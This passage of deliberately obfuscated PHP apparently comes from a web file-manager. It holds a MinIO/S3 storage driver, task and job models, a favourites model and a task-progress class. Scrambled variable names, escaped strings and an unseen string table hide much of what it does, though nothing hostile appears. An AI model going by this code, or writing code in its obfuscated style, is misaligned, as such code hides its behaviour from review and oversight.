(!$ÅëøÆé) { return !1; } unset($ˆ«ê´é·[$û‰Š°—[222]], $ˆ«ê´é·[$û‰Š°—[226]]); $ˆ«ê´é·[$û‰Š°—[95]] = $ÌóØ²Æ†; $„’ô¢éš = $this->multiUploadAuthData($ÌóØ²Æ†, $ˆ«ê´é·); if (empty($„’ô¢éš)) { return !1; } return array($û‰Š°—[231] => $„’ô¢éš, $û‰Š°—[221] => $ˆ«ê´é·[$û‰Š°—[221]], $û‰Š°—[233] => $ÅëøÆé); } public function getHost() { return parent::getHost() . $_SERVER[Æ š¦İÈ][8] . $this->bucket; } public function size($ˆ—Í§Ä) { $«éåûñ™ = $this->objectMeta($ˆ—Í§Ä); return $«éåûñ™ ? $«éåûñ™[$_SERVER[Æ š¦İÈ][80]] : 0; } public function info($¢ƒíËØÏ) { if ($this->isFolder($¢ƒíËØÏ)) { return $this->folderInfo($¢ƒíËØÏ); } else { if ($this->isFile($¢ƒíËØÏ)) { return $this->fileInfo($¢ƒíËØÏ); } } return !1; } public function exist($ŒßÊ‚ŞŞ) { return $this->isFile($ŒßÊ‚ŞŞ) || $this->isFolder($ŒßÊ‚ŞŞ); } public function isFile($ä»–Â©å) { return !$this->isFolder($ä»–Â©å) && $this->objectMeta($ä»–Â©å); } public function isFolder($×÷½ç¾ˆ) { return $this->cacheMethod($_SERVER[Æ š¦İÈ][200], $×÷½ç¾ˆ); } protected function objectMeta($Îâç›¤Å) { return $this->cacheMethod($_SERVER[Æ š¦İÈ][201], $Îâç›¤Å); } protected function _objectMeta($—Ì£¹È¿) { $§ÑªîÇÀ =& $_SERVER[Æ š¦İÈ]; $—Ì£¹È¿ = rtrim($—Ì£¹È¿, $§ÑªîÇÀ[8]); try { $—¾¤¯Šó = $this->client->getObjectInfo($this->bucket, $—Ì£¹È¿); if (!isset($—¾¤¯Šó[$§ÑªîÇÀ[218]]) && isset($—¾¤¯Šó[$§ÑªîÇÀ[234]])) { $—¾¤¯Šó[$§ÑªîÇÀ[218]] = $—¾¤¯Šó[$§ÑªîÇÀ[234]]; } } catch (Exception $äÔô«Ü‹) { $—¾¤¯Šó = !1; } if (!$—¾¤¯Šó) { } return $—¾¤¯Šó; } protected function _isFolder($Ô£ŒÅàæ) { $ã‡©»Ş =& $_SERVER[Æ š¦İÈ]; $Ô£ŒÅàæ = rtrim($Ô£ŒÅàæ, $ã‡©»Ş[8]); if ($Ô£ŒÅàæ == $ã‡©»Ş[12] || $Ô£ŒÅàæ == $ã‡©»Ş[8]) { return !0; } $ğ¢ººµ· = $this->client->getBucket($this->bucket, $Ô£ŒÅàæ, null, 1); if (empty($ğ¢ººµ·[$ã‡©»Ş[199]])) { return !1; } $Ğ„—¾ìŠ = $ğ¢ººµ·[$ã‡©»Ş[199]][0][$ã‡©»Ş[32]]; return stripos($Ğ„—¾ìŠ, $Ô£ŒÅàæ . $ã‡©»Ş[8]) === 0 ? !0 : !1; if (substr($Ğ„—¾ìŠ, -1) == $ã‡©»Ş[8]) { return !0; } if (get_path_this($Ğ„—¾ìŠ) == get_path_this($Ô£ŒÅàæ)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Ù¼¢×Í¯) { parent::__construct($Ù¼¢×Í¯); $this->signatureVersion($_SERVER[Æ š¦İÈ][213]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto F§óÊç÷Î; cæÆ¾›ÄÍ: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\x2e\x74\141\x73\153\114\x69\163\164"; public $field = array("\156\x61\x6d\x65", "\x74\171\160\145", "\145\x76\x65\x6e\164", "\x74\151\x6d\x65", "\144\x65\163\143", "\163\x79\163\x74\145\x6d", "\145\x6e\x61\x62\x6c\x65", "\154\x61\x73\x74\x52\x75\x6e", "\163\157\x72\x74"); public function listData($‘„ßšÎ„ = false, $†˜»‹Ïë = "\163\157\162\x74", $ÈÜ¯ğÔ² = false) { return parent::listData($‘„ßšÎ„, $†˜»‹Ïë, $ÈÜ¯ğÔ²); } public function add($õ¾«ÓÂ×) { $Ï»¦Ñú™ =& $_SERVER[Æ š¦İÈ]; $§“ĞÎ¸ = $this->findByName($õ¾«ÓÂ×[$Ï»¦Ñú™[32]]); if ($§“ĞÎ¸) { return !1; } $õ¾«ÓÂ×[$Ï»¦Ñú™[1605]] = 0; $õ¾«ÓÂ×[$Ï»¦Ñú™[1835]] = $this->getSort(); return parent::insert($õ¾«ÓÂ×); } private function getSort() { $×ˆÙı =& $_SERVER[Æ š¦İÈ]; $ãÚÌÁîô = parent::listData(); $©şâ½¡ = array_to_keyvalue($ãÚÌÁîô, $×ˆÙı[12], $×ˆÙı[1835]); return empty($©şâ½¡) ? 0 : max($©şâ½¡) + 1; } public function update($Í—ê‡¶ö, $´Ä¾ÊôÁ) { $àá‹„’ =& $_SERVER[Æ š¦İÈ]; $ÂĞÀşŠ = $this->listData($Í—ê‡¶ö); $ŒïêĞŸ¨ = $this->findByName($´Ä¾ÊôÁ[$àá‹„’[32]]); if (!$ÂĞÀşŠ || $ŒïêĞŸ¨ && $ŒïêĞŸ¨[$àá‹„’[403]] != $ÂĞÀşŠ[$àá‹„’[403]]) { return !1; } return parent::update($Í—ê‡¶ö, $´Ä¾ÊôÁ); } public function remove($áÔ®Õåå, $ùÁñ© = false) { $§†Ø˜¼— =& $_SERVER[Æ š¦İÈ]; $ÛÖ¸Ğƒ = $this->listData($áÔ®Õåå); if (!$ÛÖ¸Ğƒ) { return; } if (!$ùÁñ© && $ÛÖ¸Ğƒ[$§†Ø˜¼—[1265]] == $§†Ø˜¼—[89]) { return !1; } return parent::remove($áÔ®Õåå); } public function enable($œåÀÕËÕ, $§ŠÇ¯¥Í) { return $this->update($œåÀÕËÕ, array($_SERVER[Æ š¦İÈ][2229] => $§ŠÇ¯¥Í)); } public function run($ğ±àä†) { return $this->update($ğ±àä†, array($_SERVER[Æ š¦İÈ][2239] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\x72\137\x66\141\x76"; protected function cacheFunctionAlias($ÙÑîûíƒ) { $İÑÕ„ØĞ =& $_SERVER[Æ š¦İÈ]; return array($İÑÕ„ØĞ[1920] => array(USER_ID, $İÑÕ„ØĞ[2240])); } protected function listData() { $«ñ¦õõŠ =& $_SERVER[Æ š¦İÈ]; $ÓçÕ–¼ˆ = array($«ñ¦õõŠ[1635] => USER_ID, $«ñ¦õõŠ[485] => 0); $á†Çõí¿ = $«ñ¦õõŠ[2241]; $æÉı”Ø = $this->field($á†Çõí¿)->where($ÓçÕ–¼ˆ)->order($«ñ¦õõŠ[2242])->select(); return $æÉı”Ø ? $æÉı”Ø : array(); } protected function resetCache() { } protected function listView() { $Éùññ¸¿ =& $_SERVER[Æ š¦İÈ]; $¡ÏÃœƒÇ = $this->listData(); $²İ¯¿Õ = array_filter_by_field($¡ÏÃœƒÇ, $Éùññ¸¿[33], $Éùññ¸¿[419]); $ğ¸ÌÄËğ = array_to_keyvalue($²İ¯¿Õ, $Éùññ¸¿[12], $Éùññ¸¿[78]); if (!$ğ¸ÌÄËğ) { return $¡ÏÃœƒÇ; } $Äá÷… ƒ = 2000; $¦¡ÙÙµ = array($Éùññ¸¿[420] => array($Éùññ¸¿[421], $ğ¸ÌÄËğ)); $†’øçÉ = Model($Éùññ¸¿[822])->listSource($¦¡ÙÙµ, $Äá÷… ƒ); $†’øçÉ = array_merge($†’øçÉ[$Éùññ¸¿[76]], $†’øçÉ[$Éùññ¸¿[77]]); $†’øçÉ = array_to_keyvalue($†’øçÉ, $Éùññ¸¿[405]); foreach ($¡ÏÃœƒÇ as $€Ìó¹¾Í => $á¦ÚÕÖ) { $ñä«Í£ = $†’øçÉ[$á¦ÚÕÖ[$Éùññ¸¿[78]]]; $ñä«Í£ = $ñä«Í£ ? $ñä«Í£ : array(); $¡ÏÃœƒÇ[$€Ìó¹¾Í] = array_merge($ñä«Í£, $á¦ÚÕÖ); } return $¡ÏÃœƒÇ; } protected function addFav($´ó†ÜÆæ, $º“Ş†ÈÔ = '', $×‹É²ïä = "\163\x6f\x75\x72\x63\145") { $æ¶ıÛ¯Ä =& $_SERVER[Æ š¦İÈ]; $¬—¼÷ó® = array($æ¶ıÛ¯Ä[1635] => USER_ID, $æ¶ıÛ¯Ä[485] => 0, $æ¶ıÛ¯Ä[425] => $×‹É²ïä, $æ¶ıÛ¯Ä[424] => $´ó†ÜÆæ); if ($this->where($¬—¼÷ó®)->find()) { return !1; } $¬—¼÷ó® = array($æ¶ıÛ¯Ä[1635] => USER_ID, $æ¶ıÛ¯Ä[485] => 0); $Ê²Ú×‘ô = $this->where($¬—¼÷ó®)->max($æ¶ıÛ¯Ä[1835]); if (!$Ê²Ú×‘ô) { $Ê²Ú×‘ô = 0; } if (!$º“Ş†ÈÔ && $×‹É²ïä == $æ¶ıÛ¯Ä[419]) { $µ§üÊ÷­ = Model($æ¶ıÛ¯Ä[1316])->where(array($æ¶ıÛ¯Ä[420] => $´ó†ÜÆæ))->find(); if (!$µ§üÊ÷­) { return !1; } $º“Ş†ÈÔ = $µ§üÊ÷­[$æ¶ıÛ¯Ä[32]]; } $º“Ş†ÈÔ = $this->getAutoName($º“Ş†ÈÔ); $ßìì€ã = array($æ¶ıÛ¯Ä[1635] => USER_ID, $æ¶ıÛ¯Ä[485] => 0, $æ¶ıÛ¯Ä[423] => $º“Ş†ÈÔ, $æ¶ıÛ¯Ä[424] => $´ó†ÜÆæ, $æ¶ıÛ¯Ä[425] => $×‹É²ïä, $æ¶ıÛ¯Ä[1816] => $Ê²Ú×‘ô + 1); return $this->add($ßìì€ã); } protected function remove($ƒ¦óúÇ) { $×Üğ¾‡ =& $_SERVER[Æ š¦İÈ]; $¤Îø€±£ = array($×Üğ¾‡[1635] => USER_ID, $×Üğ¾‡[422] => $ƒ¦óúÇ); return $this->where($¤Îø€±£)->delete(); } protected function removeByName($Ù”›ÏØñ) { $´¬÷»õÔ =& $_SERVER[Æ š¦İÈ]; $÷°šŸÄ = array($´¬÷»õÔ[1635] => USER_ID, $´¬÷»õÔ[423] => $Ù”›ÏØñ, $´¬÷»õÔ[485] => 0); return $this->where($÷°šŸÄ)->delete(); } protected function rename($»ºĞ˜£Û, $©Ûğƒ°•) { $‹‡Å®‡´ =& $_SERVER[Æ š¦İÈ]; if ($»ºĞ˜£Û == $©Ûğƒ°•) { return !1; } $Êøš€¸­ = $this->getAutoName($©Ûğƒ°•); if ($©Ûğƒ°• != $Êøš€¸­) { return !1; } $«ó‰‘Ü× = array($‹‡Å®‡´[1635] => USER_ID, $‹‡Å®‡´[485] => 0, $‹‡Å®‡´[32] => $»ºĞ˜£Û); return $this->where($«ó‰‘Ü×)->save(array($‹‡Å®‡´[32] => $©Ûğƒ°•)); } protected function resetSort($ø„˜“Ææ) { $æÙò¨§á =& $_SERVER[Æ š¦İÈ]; $ø„˜“Ææ = is_array($ø„˜“Ææ) ? $ø„˜“Ææ : array(); $²¹ îéÒ = array($æÙò¨§á[1635] => USER_ID); for ($¡¦›×Ş = 0; $¡¦›×Ş < count($ø„˜“Ææ); $¡¦›×Ş++) { $²¹ îéÒ[$æÙò¨§á[422]] = $ø„˜“Ææ[$¡¦›×Ş]; $this->where($²¹ îéÒ)->save(array($æÙò¨§á[1816] => $¡¦›×Ş + 1)); } return !0; } protected function moveTop($‰ÜšÑü®) { $ïæÁÛÛË =& $_SERVER[Æ š¦İÈ]; $Ò€¸Š„ = array($ïæÁÛÛË[1635] => USER_ID, $ïæÁÛÛË[485] => 0); $ãÆ½Ä¯Ô = $this->where($Ò€¸Š„)->where(array($ïæÁÛÛË[32] => $‰ÜšÑü®))->find(); if (!$ãÆ½Ä¯Ô) { return; } $»£ƒüÖê = $this->field($ïæÁÛÛË[403])->where($Ò€¸Š„)->order($ïæÁÛÛË[2242])->select(); $»£ƒüÖê = array_to_keyvalue($»£ƒüÖê, $ïæÁÛÛË[12], $ïæÁÛÛË[403]); $š£Æè‘È = $»£ƒüÖê; $»£ƒüÖê = array_remove_value($»£ƒüÖê, $ãÆ½Ä¯Ô[$ïæÁÛÛË[403]]); array_unshift($»£ƒüÖê, $ãÆ½Ä¯Ô[$ïæÁÛÛË[403]]); return $this->resetSort($»£ƒüÖê); } protected function moveBottom($ßà–‚¹‚) { $à€çÑÅ‚ =& $_SERVER[Æ š¦İÈ]; $ÑÏ€ğ’÷ = array($à€çÑÅ‚[1635] => USER_ID, $à€çÑÅ‚[485] => 0); $çïÕÅ©™ = $this->where($ÑÏ€ğ’÷)->max($à€çÑÅ‚[1835]); $›÷ÖŞÈå = array($à€çÑÅ‚[1835] => $çïÕÅ©™ + 1); return $this->where($ÑÏ€ğ’÷)->where(array($à€çÑÅ‚[32] => $ßà–‚¹‚))->save($›÷ÖŞÈå); } private function getAutoName($ëÇı®ˆÊ) { $øÜíà­Œ =& $_SERVER[Æ š¦İÈ]; $áÏÉ‡‰ = array($øÜíà­Œ[1635] => USER_ID, $øÜíà­Œ[485] => 0); $ŞóøÔï = $this->field($øÜíà­Œ[32])->where($áÏÉ‡‰)->select(); $ŞóøÔï = array_to_keyvalue($ŞóøÔï, $øÜíà­Œ[12], $øÜíà­Œ[32]); if (!$ŞóøÔï || !in_array($ëÇı®ˆÊ, $ŞóøÔï)) { return $ëÇı®ˆÊ; } for ($ûˆİÌ¦… = 0; $ûˆİÌ¦… < count($ŞóøÔï); $ûˆİÌ¦…++) { if (!in_array($ëÇı®ˆÊ . "\x28{$ûˆİÌ¦…}\51", $ŞóøÔï)) { return $ëÇı®ˆÊ . "\50{$ûˆİÌ¦…}\51"; } } return $ëÇı®ˆÊ . "\x28{$ûˆİÌ¦…}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\56\152\157\142\x4c\151\163\164"; public $field = array("\156\x61\155\x65", "\x64\145\163\x63", "\163\157\162\x74"); const JOB_KEY = "\163\145\x6c\146\x4a\x6f\x62\114\x69\x73\x74"; public function listData($£ı¶œ©Š = false, $ë‚İÓ = "\163\157\162\x74", $’ˆ²¾Ã™ = false) { return parent::listData($£ı¶œ©Š, $ë‚İÓ, $’ˆ²¾Ã™); } public function remove($ë³Çöğ¾) { return parent::remove($ë³Çöğ¾); } public function add($¤â¡áš²) { $ø¾ñæóª =& $_SERVER[Æ š¦İÈ]; if ($this->findByName($¤â¡áš²[$ø¾ñæóª[32]])) { return !1; } $¤â¡áš²[$ø¾ñæóª[1835]] = $this->getSort(); return parent::insert($¤â¡áš²); } private function getSort() { $îïÊâŠÇ =& $_SERVER[Æ š¦İÈ]; $²­å˜˜ß = parent::listData(); $êÈÕó‹€ = array_to_keyvalue($²­å˜˜ß, $îïÊâŠÇ[12], $îïÊâŠÇ[1835]); return empty($êÈÕó‹€) ? 0 : max($êÈÕó‹€) + 1; } public function update($‘¨‰øêş, $ÌÉ‹Ú¨) { $Ñá½â¿ =& $_SERVER[Æ š¦İÈ]; $„§ËºĞ¤ = parent::listData($‘¨‰øêş); $ö¬¶¾ëñ = $this->findByName($ÌÉ‹Ú¨[$Ñá½â¿[32]]); if (!$„§ËºĞ¤ || $ö¬¶¾ëñ && $ö¬¶¾ëñ[$Ñá½â¿[403]] != $„§ËºĞ¤[$Ñá½â¿[403]]) { return !1; } return parent::update($‘¨‰øêş, $ÌÉ‹Ú¨); } public function setUserJob($ßœ¹Ôì, $ôëŸôÂ) { $¹ùµôæ× =& $_SERVER[Æ š¦İÈ]; if (!is_array($ôëŸôÂ)) { $ôëŸôÂ = array($ôëŸôÂ); } $ªŠîù’ = parent::listData(); $ê’ÚòƒÇ = array_to_keyvalue($ªŠîù’, $¹ùµôæ×[32]); $ÌñØÕ¥Í = $¹ùµôæ×[375]; foreach ($ôëŸôÂ as $õŠ®‚İ†) { if ($ê’ÚòƒÇ[$õŠ®‚İ†]) { $ÌñØÕ¥Í .= $ê’ÚòƒÇ[$õŠ®‚İ†][$¹ùµôæ×[403]] . $¹ùµôæ×[50]; } else { $û‡ÓìÆŞ = $this->add($õŠ®‚İ†); $ÌñØÕ¥Í .= $û‡ÓìÆŞ . $¹ùµôæ×[50]; } } $ÌñØÕ¥Í = rtrim($ÌñØÕ¥Í, $¹ùµôæ×[50]); Model($¹ùµôæ×[540])->metaSet($ßœ¹Ôì, self::JOB_KEY, $ÌñØÕ¥Í); } public function getUserJob($ÑÕ©ş÷›) { $í¢ı¬ö‰ = Model($_SERVER[Æ š¦İÈ][540])->metaGet($ÑÕ©ş÷›); return $this->getUserJobInfo($í¢ı¬ö‰[self::JOB_KEY]); } public function getUserJobInfo($º¦òÓä–) { $Ç¬Ş£¶Ş =& $_SERVER[Æ š¦İÈ]; $ü ğƒúŠ = explode($Ç¬Ş£¶Ş[50], $º¦òÓä–); $Ö¥çÔ« = parent::listData(); $Ö¥çÔ« = array_remove_key($Ö¥çÔ«, $Ç¬Ş£¶Ş[195]); $»Ü©Ò§´ = array(); foreach ($ü ğƒúŠ as $û‘¬œšã) { if (isset($Ö¥çÔ«[$û‘¬œšã])) { $»Ü©Ò§´[] = $Ö¥çÔ«[$û‘¬œšã]; } } return $»Ü©Ò§´; } } goto A¨øÚ”‡ßµ; BÀ§œ‰íƒ: class Task { const STATYS_STOP = "\x73\164\157\x70"; const STATYS_RUNNING = "\x72\x75\156\x6e\151\156\x67"; const STATYS_KILL = "\153\x69\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($ëû†ıËª, $°À«ÔÉ = '', $® ß‘¿ = 0, $£õ½°‡ = '') { $£Ê†ñà =& $_SERVER[Æ š¦İÈ]; if (self::get($ëû†ıËª)) { return; } $this->task = array($£Ê†ñà[403] => $ëû†ıËª, $£Ê†ñà[1644] => USER_ID, $£Ê†ñà[1544] => $£õ½°‡, $£Ê†ñà[33] => $°À«ÔÉ, $£Ê†ñà[1055] => $£Ê†ñà[12], $£Ê†ñà[783] => $® ß‘¿, $£Ê†ñà[1645] => 0, $£Ê†ñà[1646] => 0, $£Ê†ñà[1647] => 0, $£Ê†ñà[1648] => timeFloat(), $£Ê†ñà[1649] => 0, $£Ê†ñà[1650] => 0, $£Ê†ñà[1651] => 0, $£Ê†ñà[1652] => 0, $£Ê†ñà[747] => $£Ê†ñà[1604]); $GLOBALS[$£Ê†ñà[1653]] = 1; Hook::bind($£Ê†ñà[1607], array($this, $£Ê†ñà[1654])); Hook::bind($£Ê†ñà[1655], array($this, $£Ê†ñà[1656])); $this->startAfter(); Hook::trigger($£Ê†ñà[1657], $this->task); $this->task[$£Ê†ñà[1650]] = timeFloat(); } public function end() { $š’¥ºÊ¹ =& $_SERVER[Æ š¦İÈ]; if (!$this->task) { return; } if ($this->task[$š’¥ºÊ¹[1650]]) { self::valueSet($this->task[$š’¥ºÊ¹[403]], !1); } $øÖ®ŸÒÁ = timeFloat() - $this->task[$š’¥ºÊ¹[1648]]; self::log($š’¥ºÊ¹[1658] . $this->task[$š’¥ºÊ¹[403]] . $š’¥ºÊ¹[1659] . $øÖ®ŸÒÁ . $š’¥ºÊ¹[1660]); Hook::unbind($š’¥ºÊ¹[1607], array($this, $š’¥ºÊ¹[1654])); Hook::unbind($š’¥ºÊ¹[1655], array($this, $š’¥ºÊ¹[1656])); $this->endAfter(); $this->task = !1; } public function update($‘”òØª¥ = 0, $’á¯Ù° = false) { $Ò‹–áûó =& $_SERVER[Æ š¦İÈ]; $Á†ÕïØö =& $this->task; if (!$Á†ÕïØö) { return; } $Á†ÕïØö[$Ò‹–áûó[1645]] += $‘”òØª¥; $Á†ÕïØö[$Ò‹–áûó[1649]] = timeFloat(); if ($Á†ÕïØö[$Ò‹–áûó[783]]) { if ($Á†ÕïØö[$Ò‹–áûó[783]] < $Á†ÕïØö[$Ò‹–áûó[1645]]) { $Á†ÕïØö[$Ò‹–áûó[783]] = $Á†ÕïØö[$Ò‹–áûó[1645]]; } $Ğóîßíš = timeFloat() - $Á†ÕïØö[$Ò‹–áûó[1648]] - $Á†ÕïØö[$Ò‹–áûó[1651]]; $Á†ÕïØö[$Ò‹–áûó[1646]] = $Á†ÕïØö[$Ò‹–áûó[1645]] / $Á†ÕïØö[$Ò‹–áûó[783]]; $Á†ÕïØö[$Ò‹–áûó[1647]] = $Á†ÕïØö[$Ò‹–áûó[1645]] / $Ğóîßíš; if ($Á†ÕïØö[$Ò‹–áûó[1646]] > 0) { $Á†ÕïØö[$Ò‹–áûó[1652]] = $Ğóîßíš * (1 - $Á†ÕïØö[$Ò‹–áûó[1646]]) / $Á†ÕïØö[$Ò‹–áûó[1646]]; } $Á†ÕïØö[$Ò‹–áûó[1652]] = $Á†ÕïØö[$Ò‹–áûó[1652]] <= 0 ? 0 : $Á†ÕïØö[$Ò‹–áûó[1652]]; } $this->updateAfter(); $Ë’ñôÜ¢ = 0.2; if (timeFloat() - $Á†ÕïØö[$Ò‹–áûó[1650]] < $Ë’ñôÜ¢ && !$’á¯Ù°) { return; } $»ºÖ‚±ç = self::get($Á†ÕïØö[$Ò‹–áûó[403]]); $À¶¼Ù¸ = $»ºÖ‚±ç[$Ò‹–áûó[747]]; if ($À¶¼Ù¸ == self::STATYS_KILL) { $ç‚±¬¹ = array($Ò‹–áûó[1661] => LNG($Ò‹–áûó[1662]), $Ò‹–áûó[1180] => !1); Cache::set($Ò‹–áûó[1663] . $this->task[$Ò‹–áûó[403]], $ç‚±¬¹, 30); $this->onKill(); $this->end(); die; } else { if ($À¶¼Ù¸ == self::STATYS_STOP) { $™èâß¦Ñ = 2; $»ºÖ‚±ç[$Ò‹–áûó[1651]] += $™èâß¦Ñ; self::valueSet($Á†ÕïØö[$Ò‹–áûó[403]], $»ºÖ‚±ç); sleep($™èâß¦Ñ); $this->update(); return; } } $Á†ÕïØö[$Ò‹–áûó[747]] = $À¶¼Ù¸ ? $À¶¼Ù¸ : $Á†ÕïØö[$Ò‹–áûó[747]]; $Á†ÕïØö[$Ò‹–áûó[1651]] = $»ºÖ‚±ç[$Ò‹–áûó[1651]] ? $»ºÖ‚±ç[$Ò‹–áûó[1651]] : 0; $Á†ÕïØö[$Ò‹–áûó[1650]] = timeFloat(); Hook::trigger($Ò‹–áûó[1664], $Á†ÕïØö); self::valueSet($Á†ÕïØö[$Ò‹–áûó[403]], $Á†ÕïØö); } public function onKillSet($ÊšäŸ´§, $şé«ºı = array()) { $this->onKillCall = array($ÊšäŸ´§, $şé«ºı); } public function onKill() { $ŸÃŸîğ =& $_SERVER[Æ š¦İÈ]; self::log($ŸÃŸîğ[1658] . $this->task[$ŸÃŸîğ[403]] . $ŸÃŸîğ[1665]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($óº§ô) { $ĞÆˆ·÷ =& $_SERVER[Æ š¦İÈ]; Cache::set($ĞÆˆ·÷[1663] . $this->task[$ĞÆˆ·÷[403]], $óº§ô, 60); return $óº§ô; } public static function get($õà•Œœ) { $£áäúº =& $_SERVER[Æ š¦İÈ]; $¾ŒÓÁ„… = self::valueGet($õà•Œœ); if (is_array($¾ŒÓÁ„…) && $¾ŒÓÁ„…[$£áäúº[1666]]) { $ñ¯öÛ¡ = ActionApply($¾ŒÓÁ„…[$£áäúº[1666]], array($¾ŒÓÁ„…)); $¾ŒÓÁ„… = is_array($ñ¯öÛ¡) ? $ñ¯öÛ¡ : $¾ŒÓÁ„…; } return $¾ŒÓÁ„…; } public static function listData() { $¬şçäã = self::valueGet(); return array_sort_by($¬şçäã, $_SERVER[Æ š¦İÈ][1648], !0); } public static function kill($äâ”ø€¸) { return self::changeStatus($äâ”ø€¸, self::STATYS_KILL); } public static function stop($¬ôÍøı×) { return self::changeStatus($¬ôÍøı×, self::STATYS_STOP); } public static function restart($îèØï«ú) { return self::changeStatus($îèØï«ú, self::STATYS_RUNNING); } public static function killAll() { $ÊÛûõÆú =& $_SERVER[Æ š¦İÈ]; $äÚĞ“°ë = self::listData(); foreach ($äÚĞ“°ë as $ù‘Åœæ­) { self::kill($ù‘Åœæ­[$ÊÛûõÆú[403]]); } sleep(2); foreach ($äÚĞ“°ë as $ù‘Åœæ­) { self::valueSet($ù‘Åœæ­[$ÊÛûõÆú[403]], !1); } } private static function changeStatus($ØıõÈÓŞ, $‚âšÌê) { $İéóà´Ó =& $_SERVER[Æ š¦İÈ]; $İÒé…úÇ = self::valueGet($ØıõÈÓŞ); if (!$İÒé…úÇ) { return !1; } $İÒé…úÇ[$İéóà´Ó[747]] = $‚âšÌê; self::valueSet($ØıõÈÓŞ, $İÒé…úÇ); self::log($İéóà´Ó[1667] . $İÒé…úÇ[$İéóà´Ó[403]] . $İéóà´Ó[1668] . $‚âšÌê); return !0; } public static function valueGet($ÏüÚ†º = false) { $²§•›è =& $_SERVER[Æ š¦İÈ]; if ($ÏüÚ†º) { $âˆÅ±¸ = Model($²§•›è[447])->where(array($²§•›è[95] => $ÏüÚ†º, $²§•›è[33] => $²§•›è[1062]))->find(); return $âˆÅ±¸ ? json_decode($âˆÅ±¸[$²§•›è[371]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($äîÄ‡—À = false) { $ØçËıøÜ =& $_SERVER[Æ š¦İÈ]; $º®‹â× = array($ØçËıøÜ[33] => $ØçËıøÜ[1062]); if ($äîÄ‡—À) { $º®‹â×[$ØçËıøÜ[1644]] = $äîÄ‡—À; } $½ß©÷Ÿ± = Model($ØçËıøÜ[447])->where($º®‹â×)->select(); $½ß©÷Ÿ± = $½ß©÷Ÿ± ? $½ß©÷Ÿ± : array(); foreach ($½ß©÷Ÿ± as $¢õé»ª‰ => $„Ô…ÒÙ) { $½ß©÷Ÿ±[$¢õé»ª‰] = json_decode($„Ô…ÒÙ[$ØçËıøÜ[371]], !0); } return $½ß©÷Ÿ±; } public static function valueSet($àİŸ«¶, $Ë³ÁçÅÌ) { $­÷®ÉÏ¢ =& $_SERVER[Æ š¦İÈ]; if (!$Ë³ÁçÅÌ) { return Model($­÷®ÉÏ¢[447])->where(array($­÷®ÉÏ¢[95] => $àİŸ«¶, $­÷®ÉÏ¢[33] => $­÷®ÉÏ¢[1062]))->delete(); } $Åì£Úìú = json_encode($Ë³ÁçÅÌ); if (!$Åì£Úìú) { ob_start(); var_dump($Ë³ÁçÅÌ); $Îøş“‘ = ob_get_clean(); self::log($­÷®ÉÏ¢[1669] . json_encode_force($Îøş“‘)); } if (!$àİŸ«¶ || !$Ë³ÁçÅÌ[$­÷®ÉÏ¢[403]]) { return !1; } $§à±ø€ğ = array($­÷®ÉÏ¢[33] => $­÷®ÉÏ¢[1062], $­÷®ÉÏ¢[1644] => USER_ID, $­÷®ÉÏ¢[95] => $àİŸ«¶, $­÷®ÉÏ¢[371] => $Åì£Úìú); $±ŞÅ½Îü = $­÷®ÉÏ¢[1670]; CacheLock::lock($±ŞÅ½Îü); Model($­÷®ÉÏ¢[447])->add($§à±ø€ğ, array(), !0); CacheLock::unlock($±ŞÅ½Îü); } public static function log($Ñ¥ÄéáÚ) { if (!GLOBAL_DEBUG) { return; } write_log($Ñ¥ÄéáÚ, $_SERVER[Æ š¦İÈ][1671]); } } class TaskFileTransfer extends Task { protected function startAfter() { $¾»ı©Êó =& $_SERVER[Æ š¦İÈ]; $»¨‰›­ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($¾»ı©Êó[1672], array($this, $¾»ı©Êó[1673])); Hook::bind($¾»ı©Êó[1204], array($this, $¾»ı©Êó[1674])); Hook::bind($¾»ı©Êó[1675], array($this, $¾»ı©Êó[1676])); Hook::bind($¾»ı©Êó[600], array($this, $¾»ı©Êó[1677])); Hook::bind($¾»ı©Êó[601], array($this, $¾»ı©Êó[1678])); Hook::bind($¾»ı©Êó[603], array($this, $¾»ı©Êó[1679])); Hook::bind($¾»ı©Êó[604], array($this, $¾»ı©Êó[1679])); Hook::bind($¾»ı©Êó[570], array($this, $¾»ı©Êó[1680])); Hook::bind($¾»ı©Êó[567], array($this, $¾»ı©Êó[1680])); Hook::bind($¾»ı©Êó[572], array($this, $¾»ı©Êó[1680])); Hook::bind($¾»ı©Êó[574], array($this, $¾»ı©Êó[1680])); Hook::bind($¾»ı©Êó[576], array($this, $¾»ı©Êó[1680])); Hook::bind($¾»ı©Êó[1681], array($this, $¾»ı©Êó[1682])); Hook::bind($¾»ı©Êó[593], array($this, $¾»ı©Êó[1683])); $this->sourceModelCopyFlag = !1; Hook::bind($¾»ı©Êó[1684], array($this, $¾»ı©Êó[1685])); Hook::bind($¾»ı©Êó[1686], array($this, $¾»ı©Êó[1687])); Hook::bind($¾»ı©Êó[1688], array($this, $¾»ı©Êó[1689])); $»¨‰›­[$¾»ı©Êó[1690]] = LNG($¾»ı©Êó[1691]); $»¨‰›­[$¾»ı©Êó[1692]] = 0; $»¨‰›­[$¾»ı©Êó[1693]] = 0; $»¨‰›­[$¾»ı©Êó[1055]] = $¾»ı©Êó[12]; $»¨‰›­[$¾»ı©Êó[1694]] = $¾»ı©Êó[12]; $»¨‰›­[$¾»ı©Êó[1695]] = 0; $»¨‰›­[$¾»ı©Êó[1696]] = 0; $»¨‰›­[$¾»ı©Êó[1697]] = 0; if (!$»¨‰›­[$¾»ı©Êó[1544]]) { $»¨‰›­[$¾»ı©Êó[1544]] = LNG($¾»ı©Êó[1698]); } } protected function endAfter() { $í‚ò¡ËË =& $_SERVER[Æ š¦İÈ]; Hook::unbind($í‚ò¡ËË[1672], array($this, $í‚ò¡ËË[1673])); Hook::unbind($í‚ò¡ËË[1204], array($this, $í‚ò¡ËË[1674])); Hook::unbind($í‚ò¡ËË[1675], 